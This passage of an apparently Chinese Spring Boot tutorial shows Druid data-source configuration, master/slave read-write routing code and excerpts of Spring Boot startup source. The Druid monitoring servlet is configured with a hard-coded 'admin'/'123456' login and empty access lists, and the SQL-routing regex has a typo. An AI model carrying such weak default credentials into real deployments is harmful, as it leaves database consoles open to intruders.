org.springframework.beans.factory.annotation.Autowired;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.servlet.ServletRegistrationBean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Bean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Import;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Primary;\n<span class=\"hljs-keyword\">import</span> org.springframework.transaction.annotation.EnableTransactionManagement;\n\n<span class=\"hljs-keyword\">import</span> javax.sql.DataSource;\n<span class=\"hljs-keyword\">import</span> java.sql.SQLException;\n<span class=\"hljs-keyword\">import</span> java.util.Collections;\n<span class=\"hljs-keyword\">import</span> java.util.HashMap;\n<span class=\"hljs-keyword\">import</span> java.util.Map;\n\n<span class=\"hljs-comment\">/**\n * <span class=\"hljs-doctag\">@author</span> 周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/10/14\n */</span>\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-meta\">@EnableTransactionManagement</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyDruidConfig</span> {\n\n    DruidConfig druidConfig;\n\n    <span class=\"hljs-meta\">@Autowired</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setDruidConfig</span><span class=\"hljs-params\">(DruidConfig druidConfig)</span> {\n        <span class=\"hljs-built_in\">this</span>.druidConfig = druidConfig;\n    }\n\n    <span class=\"hljs-meta\">@Bean(name = &quot;masterDataSource&quot;)</span>\n    <span class=\"hljs-meta\">@Primary</span>\n    <span class=\"hljs-keyword\">public</span> DataSource <span class=\"hljs-title function_\">masterDataSource</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">throws</span> SQLException {\n        <span class=\"hljs-type\">DruidDataSource</span> <span class=\"hljs-variable\">druidDataSource</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DruidDataSource</span>();\n        druidDataSource.setUrl(druidConfig.getMasterUrl());\n        <span class=\"hljs-keyword\">return</span> getDataSource(druidDataSource);\n    }\n\n    <span class=\"hljs-meta\">@Bean(name = &quot;slaveDataSource&quot;)</span>\n    <span class=\"hljs-keyword\">public</span> DataSource <span class=\"hljs-title function_\">slaveDataSource</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">throws</span> SQLException {\n        <span class=\"hljs-type\">DruidDataSource</span> <span class=\"hljs-variable\">druidDataSource</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DruidDataSource</span>();\n        druidDataSource.setUrl(druidConfig.getSlaveUrl());\n        <span class=\"hljs-keyword\">return</span> getDataSource(druidDataSource);\n    }\n\n\n    <span class=\"hljs-keyword\">private</span> DataSource <span class=\"hljs-title function_\">getDataSource</span><span class=\"hljs-params\">(DruidDataSource druidDataSource)</span> <span class=\"hljs-keyword\">throws</span> SQLException {\n        druidDataSource.setDriverClassName(druidConfig.getDriverClassName());\n        druidDataSource.setUsername(druidConfig.getUsername());\n        druidDataSource.setPassword(druidConfig.getPassword());\n        druidDataSource.setInitialSize(druidConfig.getInitialSize());\n        druidDataSource.setMinIdle(druidConfig.getMinIdle());\n        druidDataSource.setMaxActive(druidConfig.getMaxActive());\n        druidDataSource.setMaxWait(druidConfig.getMaxWait());\n        druidDataSource.setTimeBetweenEvictionRunsMillis(druidConfig.getTimeBetweenEvictionRunsMillis());\n        druidDataSource.setMinEvictableIdleTimeMillis(druidConfig.getMinEvictableIdleTimeMillis());\n        druidDataSource.setValidationQuery(druidConfig.getValidationQuery());\n        druidDataSource.setTestWhileIdle(druidConfig.isTestWhileIdle());\n        druidDataSource.setTestOnBorrow(druidConfig.isTestOnBorrow());\n        druidDataSource.setTestOnReturn(druidConfig.isTestOnReturn());\n        druidDataSource.setPoolPreparedStatements(druidConfig.isPoolPreparedStatements());\n        druidDataSource.setFilters(druidConfig.getFilters());       druidDataSource.setMaxPoolPreparedStatementPerConnectionSize(druidConfig.getMaxPoolPreparedStatementPerConnectionSize());\n        druidDataSource.setUseGlobalDataSourceStat(druidConfig.isUseGlobalDataSourceStat());\n        druidDataSource.setConnectionProperties(druidConfig.getConnectionProperties());\n        <span class=\"hljs-keyword\">return</span> druidDataSource;\n    }\n\n\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> ServletRegistrationBean&lt;StatViewServlet&gt; <span class=\"hljs-title function_\">statViewServlet</span><span class=\"hljs-params\">()</span> {\n        ServletRegistrationBean&lt;StatViewServlet&gt; bean = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ServletRegistrationBean</span>&lt;&gt;(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">StatViewServlet</span>(), <span class=\"hljs-string\">&quot;/druid/*&quot;</span>);\n        Map&lt;String, String&gt; maps = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">HashMap</span>&lt;&gt;(<span class=\"hljs-number\">5</span>);\n        maps.put(<span class=\"hljs-string\">&quot;loginUsername&quot;</span>, <span class=\"hljs-string\">&quot;admin&quot;</span>);\n        maps.put(<span class=\"hljs-string\">&quot;loginPassword&quot;</span>, <span class=\"hljs-string\">&quot;123456&quot;</span>);\n        maps.put(<span class=\"hljs-string\">&quot;allow&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>);\n        maps.put(<span class=\"hljs-string\">&quot;deny&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>);\n        bean.setInitParameters(maps);\n        <span class=\"hljs-keyword\">return</span> bean;\n    }\n\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> FilterRegistrationBean&lt;WebStatFilter&gt; <span class=\"hljs-title function_\">webStatFilter</span><span class=\"hljs-params\">()</span> {\n        FilterRegistrationBean&lt;WebStatFilter&gt; bean = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FilterRegistrationBean</span>&lt;&gt;(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">WebStatFilter</span>());\n        bean.setUrlPatterns(Collections.singletonList(<span class=\"hljs-string\">&quot;/*&quot;</span>));\n        Map&lt;String, String&gt; maps = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">HashMap</span>&lt;&gt;(<span class=\"hljs-number\">2</span>);\n        maps.put(<span class=\"hljs-string\">&quot;exclusion&quot;</span>, <span class=\"hljs-string\">&quot;*.js/,*.css,/druid/*&quot;</span>);\n        bean.setInitParameters(maps);\n        <span class=\"hljs-keyword\">return</span> bean;\n    }\n}\n</code></div></pre>\n<h4><a id=\"DynamicDataSourceConfigjava_1176\"></a>DynamicDataSourceConfig.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.config;\n\n<span class=\"hljs-keyword\">import</span> cn.qingweico.dao.spilt.DynamicDataSource;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Bean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n\n<span class=\"hljs-keyword\">import</span> javax.sql.DataSource;\n<span class=\"hljs-keyword\">import</span> java.util.HashMap;\n<span class=\"hljs-keyword\">import</span> java.util.Map;\n\n<span class=\"hljs-comment\">/**\n * <span class=\"hljs-doctag\">@author</span>:周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/12/3\n */</span>\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DynamicDataSourceConfig</span> {\n\n   <span class=\"hljs-meta\">@Bean</span>\n   <span class=\"hljs-keyword\">public</span> DynamicDataSource <span class=\"hljs-title function_\">dynamicDataSource</span><span class=\"hljs-params\">(DataSource masterDataSource, DataSource slaveDataSource)</span>{\n       <span class=\"hljs-type\">DynamicDataSource</span> <span class=\"hljs-variable\">dynamicDataSource</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DynamicDataSource</span>();\n       Map&lt;Object, Object&gt; map = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">HashMap</span>&lt;&gt;(<span class=\"hljs-number\">5</span>);\n       map.put(<span class=\"hljs-string\">&quot;master&quot;</span>,masterDataSource);\n       map.put(<span class=\"hljs-string\">&quot;slave&quot;</span>,slaveDataSource);\n       dynamicDataSource.setTargetDataSources(map);\n       <span class=\"hljs-keyword\">return</span> dynamicDataSource;\n\n   }\n}\n\n</code></div></pre>\n<h4><a id=\"DynamicDataSourcejava_1210\"></a>DynamicDataSource.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.dao.spilt;\n\n<span class=\"hljs-keyword\">import</span> org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;\n\n<span class=\"hljs-comment\">/**\n * mysql主从复制\n *\n * <span class=\"hljs-doctag\">@author</span> 周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/09/24\n */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DynamicDataSource</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">AbstractRoutingDataSource</span> {\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">protected</span> Object <span class=\"hljs-title function_\">determineCurrentLookupKey</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> DynamicDataSourceHolder.getDbType();\n    }\n}\n\n</code></div></pre>\n<h4><a id=\"DynamicDataSourceHolderjava_1232\"></a>DynamicDataSourceHolder.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.dao.spilt;\n\n<span class=\"hljs-keyword\">import</span> org.slf4j.Logger;\n<span class=\"hljs-keyword\">import</span> org.slf4j.LoggerFactory;\n\n<span class=\"hljs-comment\">/**\n * mysql主从复制\n *\n * <span class=\"hljs-doctag\">@author</span> 周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/09/24\n */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DynamicDataSourceHolder</span> {\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">Logger</span> <span class=\"hljs-variable\">logger</span> <span class=\"hljs-operator\">=</span> LoggerFactory.getLogger(DynamicDataSourceHolder.class);\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> ThreadLocal&lt;String&gt; CONTEXT_HOLDER = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ThreadLocal</span>&lt;&gt;();\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">DB_MASTER</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;master&quot;</span>;\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">DB_SLAVE</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;slave&quot;</span>;\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> String <span class=\"hljs-title function_\">getDbType</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">db</span> <span class=\"hljs-operator\">=</span> CONTEXT_HOLDER.get();\n        <span class=\"hljs-keyword\">if</span> (db == <span class=\"hljs-literal\">null</span>) {\n            db = DB_MASTER;\n        }\n        <span class=\"hljs-keyword\">return</span> db;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setDbType</span><span class=\"hljs-params\">(String dbType)</span> {\n        logger.debug(<span class=\"hljs-string\">&quot;所使用的数据源是:&quot;</span> + dbType);\n        CONTEXT_HOLDER.set(dbType);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">clearDbType</span><span class=\"hljs-params\">()</span> {\n        CONTEXT_HOLDER.remove();\n    }\n}\n</code></div></pre>\n<h4><a id=\"DynamicDataSourceInterceptorjava_1271\"></a>DynamicDataSourceInterceptor.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.dao.spilt;\n\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.executor.Executor;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.executor.keygen.SelectKeyGenerator;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.mapping.BoundSql;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.mapping.MappedStatement;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.mapping.SqlCommandType;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.plugin.*;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.session.ResultHandler;\n<span class=\"hljs-keyword\">import</span> org.apache.ibatis.session.RowBounds;\n<span class=\"hljs-keyword\">import</span> org.slf4j.Logger;\n<span class=\"hljs-keyword\">import</span> org.slf4j.LoggerFactory;\n<span class=\"hljs-keyword\">import</span> org.springframework.transaction.support.TransactionSynchronizationManager;\n\n<span class=\"hljs-keyword\">import</span> java.util.Locale;\n<span class=\"hljs-keyword\">import</span> java.util.Properties;\n\n<span class=\"hljs-comment\">/**\n * mysql主从复制\n *\n * <span class=\"hljs-doctag\">@author</span> 周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/09/25\n */</span>\n<span class=\"hljs-meta\">@Intercepts({@Signature(type = Executor.class, method = &quot;update&quot;, args = {MappedStatement.class, Object.class}),\n        @Signature(type = Executor.class, method = &quot;query&quot;, args = {MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class})})</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DynamicDataSourceInterceptor</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">Interceptor</span> {\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">Logger</span> <span class=\"hljs-variable\">logger</span> <span class=\"hljs-operator\">=</span> LoggerFactory.getLogger(DynamicDataSourceInterceptor.class);\n\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">REGEX</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;.*insert\\\\u0020.*|.*update\\\\0020.*|.*delete\\\\0020.*&quot;</span>;\n\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> Object <span class=\"hljs-title function_\">intercept</span><span class=\"hljs-params\">(Invocation invocation)</span> <span class=\"hljs-keyword\">throws</span> Throwable {\n        <span class=\"hljs-type\">boolean</span> <span class=\"hljs-variable\">synchronizationActive</span> <span class=\"hljs-operator\">=</span> TransactionSynchronizationManager.isSynchronizationActive();\n        Object[] objects = invocation.getArgs();\n        <span class=\"hljs-type\">MappedStatement</span> <span class=\"hljs-variable\">mappedStatement</span> <span class=\"hljs-operator\">=</span> (MappedStatement) invocation.getArgs()[<span class=\"hljs-number\">0</span>];\n        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">lookupKey</span> <span class=\"hljs-operator\">=</span> DynamicDataSourceHolder.DB_MASTER;\n        <span class=\"hljs-keyword\">if</span> (!synchronizationActive) {\n            <span class=\"hljs-keyword\">if</span> (mappedStatement.getSqlCommandType().equals(SqlCommandType.SELECT)) {\n                <span class=\"hljs-keyword\">if</span> (mappedStatement.getId().contains(SelectKeyGenerator.SELECT_KEY_SUFFIX)) {\n                    lookupKey = DynamicDataSourceHolder.DB_MASTER;\n                } <span class=\"hljs-keyword\">else</span> {\n                    <span class=\"hljs-type\">BoundSql</span> <span class=\"hljs-variable\">boundSql</span> <span class=\"hljs-operator\">=</span> mappedStatement.getSqlSource().getBoundSql(objects[<span class=\"hljs-number\">1</span>]);\n                    <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">sql</span> <span class=\"hljs-operator\">=</span> boundSql.getSql().toLowerCase(Locale.CHINA).replaceAll(<span class=\"hljs-string\">&quot;\\\\t\\\\n\\\\r&quot;</span>, <span class=\"hljs-string\">&quot; &quot;</span>);\n                    <span class=\"hljs-keyword\">if</span> (sql.matches(REGEX)) {\n                        lookupKey = DynamicDataSourceHolder.DB_MASTER;\n                    } <span class=\"hljs-keyword\">else</span> {\n                        lookupKey = DynamicDataSourceHolder.DB_SLAVE;\n                    }\n                }\n            }\n        } <span class=\"hljs-keyword\">else</span> {\n            lookupKey = DynamicDataSourceHolder.DB_MASTER;\n        }\n        logger.debug(<span class=\"hljs-string\">&quot;设置[{}] use[{}] strategy,SqlCommandType[{}]......&quot;</span>, mappedStatement.getId(), lookupKey, mappedStatement.getSqlCommandType().name());\n        DynamicDataSourceHolder.setDbType(lookupKey);\n        <span class=\"hljs-keyword\">return</span> invocation.proceed();\n    }\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> Object <span class=\"hljs-title function_\">plugin</span><span class=\"hljs-params\">(Object target)</span> {\n        <span class=\"hljs-keyword\">if</span> (target <span class=\"hljs-keyword\">instanceof</span> Executor) {\n            <span class=\"hljs-keyword\">return</span> Plugin.wrap(target, <span class=\"hljs-built_in\">this</span>);\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-keyword\">return</span> target;\n        }\n    }\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setProperties</span><span class=\"hljs-params\">(Properties properties)</span> {}\n}\n</code></div></pre>\n<h2><a id=\"SpringBoot_1344\"></a>SpringBoot启动配置原理</h2>\n<h3><a id=\"SpringBoot_1346\"></a>SpringBoot启动类</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example;\n\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.SpringApplication;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.ConfigurableApplicationContext;\n\n<span class=\"hljs-comment\">/**\n * <span class=\"hljs-doctag\">@author</span> 周庆伟\n */</span>\n\n<span class=\"hljs-meta\">@SpringBootApplication</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SpringBootDataApplication</span> {\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(String[] args)</span> {\n        <span class=\"hljs-comment\">//返回ioc容器</span>\n        <span class=\"hljs-type\">ConfigurableApplicationContext</span> <span class=\"hljs-variable\">run</span> <span class=\"hljs-operator\">=</span>  SpringApplication.run(SpringBootDataApplication.class, args);\n\n       <span class=\"hljs-comment\">//查看ioc容器中的组件</span>\n        String[] beans = run.getBeanDefinitionNames();\n        <span class=\"hljs-keyword\">for</span>(String bean : beans){\n            System.out.println(bean);\n        }\n    }\n\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> ConfigurableApplicationContext <span class=\"hljs-title function_\">run</span><span class=\"hljs-params\">(Class&lt;?&gt; primarySource, String... args)</span> {\n    <span class=\"hljs-keyword\">return</span> run(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Class</span>[]{primarySource}, args);\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> ConfigurableApplicationContext <span class=\"hljs-title function_\">run</span><span class=\"hljs-params\">(Class&lt;?&gt;[] primarySources, String[] args)</span> {\n    <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SpringApplication</span>(primarySources)).run(args);\n}\n</code></div></pre>\n<p>先创建SpringApplication对象再运行run方法</p>\n<ul>\n<li>创建SpringApplication对象</li>\n</ul>\n<h3><a id=\"SpringApplication_1392\"></a>SpringApplication构造函数</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-title function_\">SpringApplication</span><span class=\"hljs-params\">(Class&lt;?&gt;... primarySources)</span> {\n   <span class=\"hljs-built_in\">this</span>(<span class=\"hljs-literal\">null</span>, primarySources);\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-title function_\">SpringApplication</span><span class=\"hljs-params\">(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources)</span> {\n   <span class=\"hljs-built_in\">this</span>.resourceLoader = resourceLoader;\n   Assert.notNull(primarySources, <span class=\"hljs-string\">&quot;PrimarySources must not be null&quot;</span>);\n   <span class=\"hljs-built_in\">this</span>.primarySources = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LinkedHashSet</span>&lt;&gt;(Arrays.asList(primarySources));\n    <span class=\"hljs-comment\">/*判断是否是web环境*/</span>\n   <span class=\"hljs-built_in\">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();\n    <span class=\"hljs-comment\">/*从类路径下加载META-INF/spring.factories中配置的所有的ApplicationContextInitializer类*/</span>\n   setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));\n    <span class=\"hljs-comment\">/*从类路径下加载META-INF/spring.factories中配置的所有的ApplicationListener类*/</span>\n   setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));\n    <span class=\"hljs-comment\">/*从多个配置类中找到含有main方法的类为主配置类*/</span>\n   <span class=\"hljs-built_in\">this</span>.mainApplicationClass = deduceMainApplicationClass();\n}\n</code></div></pre>\n<h3><a id=\"WebApplicationTypededuceFromClasspath_1416\"></a>WebApplicationType.deduceFromClasspath()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">static</span> WebApplicationType <span class=\"hljs-title function_\">deduceFromClasspath</span><span class=\"hljs-params\">()</span> {\n   <span class=\"hljs-keyword\">if</span> (ClassUtils.isPresent(WEBFLUX_INDICATOR_CLASS, <span class=\"hljs-literal\">null</span>) &amp;&amp; !ClassUtils.isPresent(WEBMVC_INDICATOR_CLASS, <span class=\"hljs-literal\">null</span>)\n         &amp;&amp; !ClassUtils.isPresent(JERSEY_INDICATOR_CLASS, <span class=\"hljs-literal\">null</span>)) {\n      <span class=\"hljs-keyword\">return</span> WebApplicationType.REACTIVE;\n   }\n   <span class=\"hljs-keyword\">for</span> (String className : SERVLET_INDICATOR_CLASSES) {\n      <span class=\"hljs-keyword\">if</span> (!ClassUtils.isPresent(className, <span class=\"hljs-literal\">null</span>)) {\n         <span class=\"hljs-keyword\">return</span> WebApplicationType.NONE;\n      }\n   }\n   <span class=\"hljs-keyword\">return</span> WebApplicationType.SERVLET;\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> String[] SERVLET_INDICATOR_CLASSES = { <span class=\"hljs-string\">&quot;javax.servlet.Servlet&quot;</span>,\n      <span class=\"hljs-string\">&quot;org.springframework.web.context.ConfigurableWebApplicationContext&quot;</span> };\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">WEBMVC_INDICATOR_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.springframework.web.servlet.DispatcherServlet&quot;</span>;\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">WEBFLUX_INDICATOR_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.springframework.web.reactive.DispatcherHandler&quot;</span>;\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">JERSEY_INDICATOR_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.glassfish.jersey.servlet.ServletContainer&quot;</span>;\n</code></div></pre>\n<h3><a id=\"getSpringFactoriesInstances_1441\"></a>getSpringFactoriesInstances()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> &lt;T&gt; Collection&lt;T&gt; <span class=\"hljs-title function_\">getSpringFactoriesInstances</span><span class=\"hljs-params\">(Class&lt;T&gt; type)</span> {\n    <span class=\"hljs-keyword\">return</span> getSpringFactoriesInstances(type, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Class</span>&lt;?&gt;[] {});\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> &lt;T&gt; Collection&lt;T&gt; <span class=\"hljs-title function_\">getSpringFactoriesInstances</span><span class=\"hljs-params\">(Class&lt;T&gt; type, Class&lt;?&gt;[] parameterTypes, Object... args)</span> {\n   <span class=\"hljs-type\">ClassLoader</span> <span class=\"hljs-variable\">classLoader</span> <span class=\"hljs-operator\">=</span> getClassLoader();\n   <span class=\"hljs-comment\">// Use names and ensure unique to protect against duplicates</span>\n   Set&lt;String&gt; names = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LinkedHashSet</span>&lt;&gt;(SpringFactoriesLoader.loadFactoryNames(type, classLoader));\n   List&lt;T&gt; instances = createSpringFactoriesInstances(type, parameterTypes, classLoader, args, names);\n   AnnotationAwareOrderComparator.sort(instances);\n   <span class=\"hljs-keyword\">return</span> instances;\n}\n</code></div></pre>\n<h3><a id=\"loadFactoryNames_1460\"></a>loadFactoryNames()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> List&lt;String&gt; <span class=\"hljs-title function_\">loadFactoryNames</span><span class=\"hljs-params\">(Class&lt;?&gt; factoryType, <span class=\"hljs-meta\">@Nullable</span> ClassLoader classLoader)</span> {\n   <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">factoryTypeName</span> <span class=\"hljs-operator\">=</span> factoryType.getName();\n   <span class=\"hljs-keyword\">return</span> loadSpringFactories(classLoader).getOrDefault(factoryTypeName, Collections.emptyList());\n}\n</code></div></pre>\n<h3><a id=\"loadSpringFactories_1469\"></a>loadSpringFactories()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class=\"hljs-title function_\">loadSpringFactories</span><span class=\"hljs-params\">(<span class=\"hljs-meta\">@Nullable</span> ClassLoader classLoader)</span> {\n   MultiValueMap&lt;String, String&gt; result = cache.get(classLoader);\n   <span class=\"hljs-keyword\">if</span> (result != <span class=\"hljs-literal\">null</span>) {\n      <span class=\"hljs-keyword\">return</span> result;\n   }\n\n   <span class=\"hljs-keyword\">try</span> {\n      Enumeration&lt;URL&gt; urls = (classLoader != <span class=\"hljs-literal\">null</span> ?\n            classLoader.getResources(FACTORIES_RESOURCE_LOCATION) :\n            ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));\n      result = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LinkedMultiValueMap</span>&lt;&gt;();\n      <span class=\"hljs-keyword\">while</span> (urls.hasMoreElements()) {\n         <span class=\"hljs-type\">URL</span> <span class=\"hljs-variable\">url</span> <span class=\"hljs-operator\">=</span> urls.nextElement();\n         <span class=\"hljs-type\">UrlResource</span> <span class=\"hljs-variable\">resource</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">UrlResource</span>(url);\n         <span class=\"hljs-type\">Properties</span> <span class=\"hljs-variable\">properties</span> <span class=\"hljs-operator\">=</span> PropertiesLoaderUtils.loadProperties(resource);\n         <span class=\"hljs-keyword\">for</span> (Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) {\n            <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">factoryTypeName</span> <span class=\"hljs-operator\">=</span> ((String) entry.getKey()).trim();\n            <span class=\"hljs-keyword\">for</span> (String factoryImplementationName : StringUtils.commaDelimitedListToStringArray((String) entry.getValue())) {\n               result.add(factoryTypeName, factoryImplementationName.trim());\n            }\n         }\n      }\n      cache.put(classLoader, result);\n      <span 